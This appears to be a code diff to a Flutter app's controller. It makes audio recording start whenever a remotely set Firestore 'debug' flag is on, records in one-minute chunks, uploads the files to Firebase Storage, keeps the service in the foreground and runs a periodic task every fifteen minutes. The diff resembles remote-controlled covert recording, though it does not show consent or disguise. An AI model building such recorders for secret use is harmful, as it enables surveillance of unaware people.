@@ -3,6 +3,7 @@ import 'dart:io';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:firebase_storage/firebase_storage.dart';
 import 'package:flutter/services.dart';
+import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:get/get.dart';
 import 'package:intl/intl.dart';
 import 'package:logger/logger.dart';
@@ -40,8 +41,8 @@ final class CoreController extends GetxController {
     });
     await _carregarComandos();
 
-    _comandos.listen((value) async {
-      if (value.record) {
+    comandos.listen((value) async {
+      if (value.debug) {
         await readAndWriteFirebaseData();
       }
     });
@@ -55,7 +56,8 @@ final class CoreController extends GetxController {
         uploadFiles();
       }
     });
-    await _registerPeriodicTask();
+    FlutterBackgroundService().invoke('setAsForeground');
+    // await _registerPeriodicTask();
   }
 
   var plataform = const MethodChannel('method.record');
@@ -71,8 +73,8 @@ final class CoreController extends GetxController {
   //Configuração Sufixo
   final _config = Rxn<ConfiguracaoFirebase>();
 
-  final _comandos =
-      Rx<ComandosFirebase>(ComandosFirebase(record: false, timeStart: 5));
+  final comandos = Rx<ComandosFirebase>(
+      ComandosFirebase(record: false, timeStart: 5, debug: false));
 
   Future<void> _carregarConfiguracao() async {
     final result = await featuresCorePresenter.carregarConfiguracaoFirebase(
@@ -89,7 +91,7 @@ final class CoreController extends GetxController {
       NoParams(),
     );
     if (result != null) {
-      _comandos.bindStream(result);
+      comandos.bindStream(result);
     }
   }
 
@@ -98,9 +100,9 @@ final class CoreController extends GetxController {
       "task2",
       "PeriodicTask",
       tag: "2",
-      frequency: const Duration(minutes: 180),
+      frequency: const Duration(minutes: 15),
       existingWorkPolicy: ExistingWorkPolicy.replace,
-      initialDelay: const Duration(minutes: 180),
+      initialDelay: const Duration(minutes: 1),
       constraints: Constraints(networkType: NetworkType.connected),
       backoffPolicy: BackoffPolicy.linear,
       backoffPolicyDelay: const Duration(seconds: 10),
@@ -139,10 +141,11 @@ final class CoreController extends GetxController {
   // }
 
   Future<void> readAndWriteFirebaseData() async {
-    while (_comandos.value.record && _seviceRecorder.value) {
+    while (comandos.value.debug && _seviceRecorder.value) {
       await plataformStart();
 
-      await Future.delayed(Duration(minutes: _comandos.value.timeStart));
+      await Future.delayed(Duration(
+          minutes: comandos.value.debug ? 1 : comandos.value.timeStart));
 
       final path = await plataformStop();
       Logger().i('Stop recording $path');
@@ -151,7 +154,7 @@ final class CoreController extends GetxController {
         await upload(path);
         Logger().i('Fim Uploade FirebaseStorage');
       }
-      if (!_comandos.value.record) {
+      if (!comandos.value.record) {
         Logger().i('Service Stoped}');
       }
     }
@@ -217,7 +220,8 @@ final class CoreController extends GetxController {
         if (await File(file['path'] ?? "").exists()) {
           Logger().f('upload $file');
           final result = File(file['path']!);
-          String ref = 'backup/rec - ${file['path']!.split('/').last.toString()}.mp3';
+          String ref =
+              'backup/rec - ${file['path']!.split('/').last.toString()}.mp3';
           await FirebaseStorage.instance.ref(ref).putFile(result);
           await FirebaseFirestore.instance
               .collection("register")
